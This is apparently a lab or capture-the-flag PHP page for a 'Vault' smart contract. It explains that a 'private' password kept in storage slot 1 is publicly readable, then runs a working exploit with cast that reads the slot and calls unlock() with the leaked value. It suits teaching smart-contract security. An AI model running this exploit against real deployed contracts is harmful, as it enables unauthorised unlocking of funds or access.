<?php
include "prepare.php";

if (!$_POST):
?>
<pre>
<b>Why Vault.sol is vulnerable?</b>

The Vault contract stores the password in storage slot 1:

    bool locked;         → slot 0
    bytes32 password;    → slot 1

Even though 'password' is marked private, all Ethereum storage
is publicly accessible.

We exploit this by:

1. Reading storage slot 1 directly with:
       cast storage <vault> 1
2. Passing the leaked password into unlock()
</pre>
<?php
exit;
endif;

echo "<pre>";

echo "<div style='color:red;font-size:22px;font-weight:bold;padding:5px;'>
=== Selected Contract & Account ===
</div>";

echo "Contract (Vault): $CONTRACT\n";
echo "Player Index:     $PLAYER_ID\n";
echo "Player Address:   $PLAYER\n\n";


// ---------------------------------------------------------------
// READ LOCKED STATUS BEFORE
// ---------------------------------------------------------------
echo "=== LOCKED BEFORE ===\n";
echo cast("cast call $CONTRACT \"locked()\" --rpc-url $RPC");


// ---------------------------------------------------------------
// READ PASSWORD FROM STORAGE SLOT 1
// ---------------------------------------------------------------
echo "\n=== READING PASSWORD FROM STORAGE SLOT 1 ===\n";

$rawPassword = trim(cast("cast storage $CONTRACT 1 --rpc-url $RPC"));
echo "Password slot raw: $rawPassword\n";


// If cast returns "0xabc..." then it's usable directly
$password = $rawPassword;


// ---------------------------------------------------------------
// EXECUTE EXPLOIT – CALL unlock(password)
// ---------------------------------------------------------------
echo "\n=== EXECUTING UNLOCK EXPLOIT ===\n";

echo cast(
    "cast send $CONTRACT \"unlock(bytes32)\" $password " .
    "--rpc-url $RPC --private-key $PK"
);


// ---------------------------------------------------------------
// READ LOCKED STATUS AFTER
// ---------------------------------------------------------------
echo "\n<div style='color:red;font-size:22px;font-weight:bold;padding:5px;'>
=== LOCKED AFTER EXPLOIT ===
</div>";

echo cast("cast call $CONTRACT \"locked()\" --rpc-url $RPC");

echo "</pre>";
?>

